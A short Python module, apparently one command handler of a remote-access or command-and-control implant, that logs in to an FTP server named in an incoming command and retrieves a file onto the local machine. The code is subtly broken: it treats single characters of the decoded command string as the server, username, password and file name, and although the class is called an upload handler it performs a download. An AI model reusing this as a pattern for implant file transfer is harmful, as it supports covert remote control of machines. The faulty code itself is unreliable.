from ftplib import FTP
from payloads.absract_payload_handler import AbstractPayloadHandler
class FTPUploadPayloadHandler(AbstractPayloadHandler):

    def execute_payload(self, data:bytes) -> str:
        '''
        server_addr,username,password,file=data[1],data[2],data[3],data[4]
        '''
        try:
            data=data.decode("utf-8")
            server_addr,uname,password,file=data[1],data[2],data[3],data[4]
            ftp=FTP(server_addr) 
            ftp.login(uname,password)
            ftp.retrbinary('RETR %s'%file, open('%s'%file, 'wb').write)
            ftp.quit()
            return 'Uploaded {} successfully'.format(file)
        except Exception as e:
            return "Command execution unsuccessful: %s\n" %str(e)
